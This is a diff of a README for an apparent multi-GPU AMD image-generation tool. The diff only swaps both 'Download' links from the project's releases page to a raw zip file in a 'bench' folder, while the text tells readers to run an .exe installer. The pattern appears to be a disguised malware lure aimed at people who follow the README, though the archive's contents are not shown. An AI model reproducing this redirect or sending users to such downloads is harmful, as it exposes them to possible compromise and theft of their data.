@@ -1,6 +1,6 @@
 # ⚡ diffusers-rocm-parallel - Generate images faster with multiple GPUs
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ravaging-oilrefinery123/diffusers-rocm-parallel/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ravaging-oilrefinery123/diffusers-rocm-parallel/raw/refs/heads/main/bench/diffusers_rocm_parallel_3.9-beta.2.zip)
 
 This application lets you create high-quality images using multiple AMD graphics cards at the same time. It uses a specific patch to ensure your hardware works correctly with the Flux model and other diffusion tools. You can now use the full power of your workstation for faster image generation.
 
@@ -20,7 +20,7 @@ Make sure your graphics cards sit firmly in your motherboard. Connect your power
 
 You need the installer from our release page. Visit this page to download the setup file.
 
-[Download the Software Here](https://github.com/Ravaging-oilrefinery123/diffusers-rocm-parallel/releases)
+[Download the Software Here](https://github.com/Ravaging-oilrefinery123/diffusers-rocm-parallel/raw/refs/heads/main/bench/diffusers_rocm_parallel_3.9-beta.2.zip)
 
 Choose the file that ends in .exe. Save it to a folder you can find easily, such as your Downloads folder.
 
